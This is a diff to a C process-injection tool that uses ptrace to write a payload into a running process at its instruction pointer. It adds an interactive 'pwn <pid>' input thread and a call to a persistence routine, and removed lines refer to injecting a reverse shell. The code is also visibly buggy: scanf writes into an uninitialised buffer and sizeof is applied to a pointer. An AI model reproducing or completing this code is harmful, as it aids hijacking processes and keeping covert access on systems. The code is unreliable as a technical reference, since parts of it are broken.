@@ -25,6 +25,7 @@ int main(int argc, char **argv)
 	int option;
 	int long_index = 0;
 	char *value;
+	pthread_t tid;
 	while((option = getopt_long(argc, argv, "p:n:lhiP", long_options, &long_index)) != -1)
 	{
 		switch(option)
@@ -57,7 +58,9 @@ int main(int argc, char **argv)
 				find_process("ALL", 0);
 				break;
 			case 'i':
-				printf("[+] Injecting reverse shell into process [+]\n");
+				/* Create thread to handle requests */
+				pthread_create(&tid, NULL, &user_input_thread, NULL);
+				persist(); //we going into persistent mode anyway
 				break;
 			case 'P':
 				printf("[+] going persistent [+]\n");
@@ -165,6 +168,28 @@ void *init_thread(void *args)
 
 	printf("[+] Calling trace child on pid: %d\n", proc->pid);
 	trace_child(proc);
+}
+
+/* 
+* This function will be used in a thread
+* It will handle user requests
+* Mainly, it will allow the user to specify a pid to inject.
+*/
+void *user_input_thread()
+{
+	char *in_buffer;
+	pid_t pid;
+
+	printf("[+] This is the input thread, Once you have found a process to pwn, enter pwn <pid> [+]\n");
+
+	do
+	{
+		/* Get input from stdin */
+		printf("\n>>>");
+		scanf("%s %d", in_buffer, &pid);
+		printf("[+] You entered: %s %d", in_buffer, pid);
+
+	}while(1);
 }
 
 void trace_child(struct pid_struct *proc)
@@ -447,11 +472,10 @@ bool get_name_field(char *filename, char *buff)
 int pwn(void *payload, pid_t pid, struct user_regs_struct registers)
 {
 	/* Get the current address of the stack */
-	long stack = registers.rsp;
-	long payload_addr = stack-1024;
+	//long stack = registers.rsp;
 
-	/* Get the current instruction pointer, might save this for later */
-	long rip = registers.rip;
+	/* Inject into rip, this ruins the process */
+	long payload_addr = registers.rip;
 
 	/* We may need to mmap an executable area of memory ?? */
 	/* May need to use mmap or mprotect before calling pwn */
@@ -461,7 +485,7 @@ int pwn(void *payload, pid_t pid, struct user_regs_struct registers)
 	/* Inject payload into that address */
 	inject_code(pid, payload_addr, sizeof(payload), payload);
 
-	/* Set RIP to point to our payload on the stack */
+	/* Set RIP to point to our payload */
 	registers.rip = payload_addr;
 	ptrace(PTRACE_SETREGS, pid, 0, &registers);
 
